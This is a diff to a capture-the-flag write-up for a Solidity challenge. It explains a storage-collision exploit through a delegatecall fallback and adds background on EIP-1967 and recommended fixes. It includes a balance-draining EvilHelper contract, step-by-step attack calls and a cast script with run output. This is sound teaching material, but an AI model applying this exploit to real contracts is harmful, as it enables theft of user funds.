@@ -13,19 +13,80 @@ author: "sid"
 
 ## Summary
 
-This is the hardened sequel to `PP Farming`: `withdrawPP()` now has a
-`noReentrancy` modifier, so the original re-entrancy trick is dead. The real
-bug is a **storage collision through the ATM's proxy-style `fallback()`**.
-The fallback happily delegatecalls arbitrary calldata into the helper
-contract (it only blacklists one selector), and the helper's `atm` variable
-lands on the exact same storage slot as the ATM's own
-`performancePointHelper` pointer. That lets an attacker hijack which
-contract `withdrawPP()` delegatecalls into, then swap in a malicious helper
-that drains the whole balance.
+`withdrawPP()` now has a `noReentrancy` modifier, so the original re-entrancy
+trick is dead. The real bug is a **storage collision through the ATM's
+proxy-style `fallback()`**. The fallback happily delegatecalls arbitrary
+calldata into the helper contract (it only blacklists one selector), and the
+helper's `atm` variable lands on the exact same storage slot as the ATM's own
+`performancePointHelper` pointer. That lets an attacker hijack which contract
+`withdrawPP()` delegatecalls into, then swap in a malicious helper that drains
+the whole balance.
 
-Verified end to end against the live instance: `performancePointHelper()`
-was confirmed to flip to the attacker's contract, and `isSolved()` returned
-`true` after `withdrawPP()` drained the ATM's balance from 10 ETH to 0.
+## Background: delegatecall and why storage layout is a security boundary
+
+To understand the attack you need to understand `delegatecall` at the EVM
+level. Not just "it runs code in the caller's context," but what that actually
+means for storage.
+
+### How `delegatecall` works
+
+Normal `call`: contract A calls contract B, B's code runs in B's context, B's
+storage is affected, B's `address(this)` is B.
+
+`delegatecall`: contract A calls contract B, B's code runs in **A's** context.
+A's storage is affected. A's balance is affected. `address(this)` inside B's
+code is A. B's own storage is never touched.
+
+This is what makes proxy patterns possible. A thin proxy holds the ETH and
+state, delegates all logic to an implementation contract that can be upgraded,
+and everything "happens" in the proxy's storage. Users always interact with the
+same proxy address.
+
+The catch (and this is the whole attack) is that `delegatecall` uses
+**slot numbers**, not variable names. Solidity assigns storage slots in
+declaration order: first declared variable gets slot 0, second gets slot 1, and
+so on. When B's code runs in A's context via `delegatecall`, any read or write
+to "slot $k$ in B's layout" actually reads or writes slot $k$ in A's storage.
+If the two contracts have different types at slot $k$, you get a silent type
+confusion that can corrupt critical state.
+
+More precisely: given contracts $A$ and $B$ with storage layouts
+
+$$A: \quad \text{slot}_0 \to v_0^A,\quad \text{slot}_1 \to v_1^A, \quad \ldots$$
+$$B: \quad \text{slot}_0 \to v_0^B,\quad \text{slot}_1 \to v_1^B, \quad \ldots$$
+
+a `delegatecall` from $A$ into $B$ that executes `sstore(k, x)` writes `x`
+into $\text{slot}_k$ of $A$'s storage, overwriting $v_k^A$ regardless of what
+type $v_k^B$ is. The compiler never checks that $v_k^A$ and $v_k^B$ agree.
+
+This is called a **storage collision**, and it's not a theoretical concern.
+The Parity Wallet hack in 2017 ($30\text{M}$ lost) was exactly this: a `delegatecall`
+in a multisig wallet's fallback function let anyone call `initWallet()` on the
+library contract, which reinitialised the wallet and made the attacker the owner.
+The slot layout between the wallet and the library was misaligned in a way the
+original developers didn't notice.
+
+### Why standard proxy patterns solve this
+
+EIP-1967 (the "transparent proxy" standard, used by OpenZeppelin's upgradeable
+contracts) sidesteps storage collisions by storing the implementation address in
+a *pseudorandom* slot derived from a hash:
+
+```
+bytes32 constant IMPL_SLOT =
+    bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1);
+    // = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
+```
+
+No handwritten Solidity variable sits at that slot. The implementation address
+lives there by direct `sstore`, invisible to the normal declaration-order layout.
+An attacker can't craft a collision by looking at the implementation contract's
+variable list, because finding a declared variable that hashes to that slot would
+require a preimage attack on Keccak-256.
+
+The challenge's ATM doesn't use EIP-1967. It stores `performancePointHelper`
+as a normal `address` at slot 1. The helper contract stores `atm` as a normal
+`address` at slot 1 too. Those two overlap.
 
 ## Solution
 
@@ -42,10 +103,15 @@ contracts:
 | 2    | `bool locked`                        | `bool helping`                      |
 
 Slot 1 in the helper (`atm`) aliases slot 1 in the ATM
-(`performancePointHelper`) when the helper's code runs via delegatecall from
-the ATM. So any helper function that writes `atm = X` — like
-`setATM(address)` — actually overwrites the ATM's real
-`performancePointHelper` pointer.
+(`performancePointHelper`) when the helper's code runs via delegatecall. So any
+helper function that writes `atm = X` (like `setATM(address)`) actually
+overwrites the ATM's real `performancePointHelper` pointer.
+
+You can verify this by thinking through what the EVM sees: the helper's
+`setATM(address _atm)` compiles to `sstore(1, _atm)`. When that runs via
+`delegatecall` from the ATM, `sstore(1, _atm)` writes to slot 1 of the ATM's
+storage. Slot 1 of the ATM is `performancePointHelper`. The compiler never
+checks that the names match.
 
 ### Step 2: Reach `setATM` through the fallback
 
@@ -69,12 +135,21 @@ fallback() external payable {
 }
 ```
 
-The fallback only blacklists `processWithdrawal(address,uint256)`. It never
-touches `setATM(address)`, `stopHelping()`, or `startHelping()` — every other
-selector on the helper is reachable through the ATM itself. Calling
-`ATM.setATM(evilHelper)` runs `PerformancePointHelper.setATM` via
-delegatecall, which writes `evilHelper` into slot 1 — i.e. it silently
-repoints `ATM.performancePointHelper` at an attacker-controlled contract.
+The fallback only blacklists `processWithdrawal(address,uint256)`. Every other
+selector on the helper is reachable through the ATM itself, including
+`setATM(address)`, `stopHelping()`, and `startHelping()`. There's no access
+control on any of them.
+
+Calling `ATM.setATM(evilHelper)` routes through the fallback, runs
+`PerformancePointHelper.setATM` via delegatecall, which executes `sstore(1,
+evilHelper)` in the ATM's storage, silently repointing
+`ATM.performancePointHelper` at an attacker-controlled contract.
+
+The selector blacklist is the kind of defense that feels reasonable until you
+think about it for five minutes. The developer locked the front door and left
+every window open. A function that doesn't check access control on a mutating
+operation is not made safe by being reachable only through a fallback. It's
+still reachable.
 
 ### Step 3: Drop in a malicious helper and withdraw
 
@@ -92,25 +167,31 @@ contract EvilHelper {
 ```
 
 `EvilHelper.processWithdrawal` ignores the `amount` argument entirely and
-just forwards the *full* ATM balance (`address(this).balance` — `this` is the
-ATM, since the code runs by delegatecall) to whoever called `withdrawPP()`.
-Now the plan is:
+forwards the *full* ATM balance to the caller. `address(this).balance` here
+refers to the ATM's balance, not EvilHelper's, because the code runs by
+`delegatecall` and `this` is always the ATM. The `amount` parameter would limit
+the withdrawal if the real helper used it. EvilHelper doesn't bother.
+
+The full attack sequence:
 
 1. Deploy `EvilHelper`.
-2. Call `ATM.setATM(evilHelper)` (through the fallback, unauthenticated —
-   there's no access control on it at all).
+2. Call `ATM.setATM(evilHelper)`. Goes through the fallback, delegatecalls
+   `setATM`, overwrites slot 1. `performancePointHelper` now points at `EvilHelper`.
 3. `donatePP(self)` with a trivial amount so `scores[self] > 0` and
    `withdrawPP()`'s `require` passes.
-4. Call `withdrawPP()`. `noReentrancy` doesn't matter — this isn't a
-   re-entrant call, it's a single normal call that now delegatecalls into
-   `EvilHelper`, which sweeps the entire ATM balance to the caller.
+4. Call `withdrawPP()`. `noReentrancy` doesn't matter. This is a single
+   normal call that now delegatecalls into `EvilHelper.processWithdrawal`, which
+   sweeps the entire ATM balance to the caller.
 5. `isSolved()` returns `true` once `address(this).balance == 0`.
+
+The reentrancy guard the developer added to fix PP Farming 1 is completely
+irrelevant here. It protects against a different threat model, one that involves
+re-entering during a call. The storage collision happens before any withdrawal
+even occurs.
 
 ```bash
 #!/usr/bin/env bash
 # PP Farming 2 - storage collision / fallback delegatecall hijack
-# Deploy EvilHelper, repoint ATM.performancePointHelper at it via setATM(),
-# then withdraw to drain the full balance.
 set -euo pipefail
 
 RPC_URL="http://REPLACE_RPC"
@@ -143,7 +224,7 @@ cast send "$ATM_ADDR" "withdrawPP()" --rpc-url "$RPC_URL" --private-key "$PK"
 cast call "$ATM_ADDR" "isSolved()(bool)" --rpc-url "$RPC_URL"
 ```
 
-Real run against the live instance:
+Live run against the instance:
 
 ```
 $ cast call $ATM_ADDR "performancePointHelper()(address)" --rpc-url $RPC_URL
@@ -170,6 +251,29 @@ $ cast balance $ATM_ADDR --rpc-url $RPC_URL --ether
 $ cast call $ATM_ADDR "isSolved()(bool)" --rpc-url $RPC_URL
 true
 ```
+
+## What a real fix looks like
+
+Three things the developer should have done differently:
+
+**Use EIP-1967 slot for the implementation pointer.** Store `performancePointHelper`
+at `keccak256("atm.helper.implementation") - 1` instead of a declared variable.
+Any collision would require finding a Keccak-256 preimage, which is computationally
+infeasible.
+
+**Add access control to `setATM`.** Even with the storage collision present,
+if `setATM` required `msg.sender == owner`, an external attacker couldn't call
+it. Defense in depth matters. The fallback is open, but the functions it
+reaches shouldn't be.
+
+**Validate selectors against an allowlist, not a blocklist.** Blocking one
+selector while allowing all others is almost always the wrong model. The fallback
+should only forward specific known-safe selectors, not everything except one
+dangerous one.
+
+The storage collision is the core bug, but the lack of access control on
+`setATM` is what makes it exploitable from outside. Fix either one and the
+attack fails.
 
 ## Flag
 
